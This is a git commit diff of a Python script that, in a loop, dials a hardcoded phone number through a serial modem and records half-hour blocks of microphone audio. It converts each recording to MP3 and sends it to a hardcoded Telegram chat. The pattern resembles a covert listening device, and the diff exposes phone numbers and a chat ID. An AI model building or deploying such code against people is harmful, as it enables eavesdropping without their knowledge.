0c783de1693f3d5041ba2fa18729592a014ea26c
white.collar <openit@bk.ru>
2021-06-30 22:23:13 +0300

    refact

--- mic1.py
+++ mic1.py
@@ -18,11 +18,8 @@ while True:
     record_secs = 1800 # seconds to record
     dev_index = 1 # device index found by p.get_device_info_by_index(ii)
     now = datetime.datetime.now()
-    #print str(now)
-    wav_output_filename = str(now) + '.wav' #'test1.wav' # name of .wav file
+    wav_output_filename = str(now) + '.wav'
     mp3_output_filename = str(now) + '.mp3'
-
-    #recipient = "89069749066"
     recipient = "89509932923"
     phone = serial.Serial("/dev/ttyS1",  9600, timeout=5)
     time.sleep(0.5)
@@ -30,45 +27,31 @@ while True:
     time.sleep(1)
     phone.write(b'ATH\r')
     time.sleep(1)
-    #phone.write(b'ATD"'+recipient.encode() +b'"\r')
     phone.write(b'ATD'+recipient.encode() +b';\r')
-    #while(1):
     print(phone.readline())
     time.sleep(5)
     print(phone.readline())
-    audio = pyaudio.PyAudio() # create pyaudio instantiation
-
-    # create pyaudio stream
+    audio = pyaudio.PyAudio()
     stream = audio.open(format = form_1,rate = samp_rate,channels = chans, \
                         input_device_index = dev_index,input = True, \
                         frames_per_buffer=chunk)
     print("recording")
     frames = []
-
-    # loop through stream and append audio chunks to frame array
     for ii in range(0,int((samp_rate/chunk)*record_secs)):
         data = stream.read(chunk)
         frames.append(data)
-        #print(phone.readline())
     print("finished recording")
-
-    # stop the stream, close it, and terminate the pyaudio instantiation
     stream.stop_stream()
     stream.close()
     audio.terminate()
-
-    # save the audio frames as .wav file
     wavefile = wave.open(wav_output_filename,'wb')
     wavefile.setnchannels(chans)
     wavefile.setsampwidth(audio.get_sample_size(form_1))
     wavefile.setframerate(samp_rate)
     wavefile.writeframes(b''.join(frames))
     wavefile.close()
-
     phone.write(b'ATH\r')
-
     AudioSegment.from_wav(wav_output_filename).export(mp3_output_filename, format="mp3")
-
     os.remove (wav_output_filename)
     logger = telebot.logger
     telebot.logger.setLevel(logging.DEBUG)
@@ -76,4 +59,3 @@ while True:
     apihelper.SESSION_TIME_TO_LIVE = 5 * 60
     audio = open (mp3_output_filename, 'rb')
     tb.send_audio('-1001206972540', audio, timeout=60)
-#    tb.send_audio('-1001206972540', "FILEID")
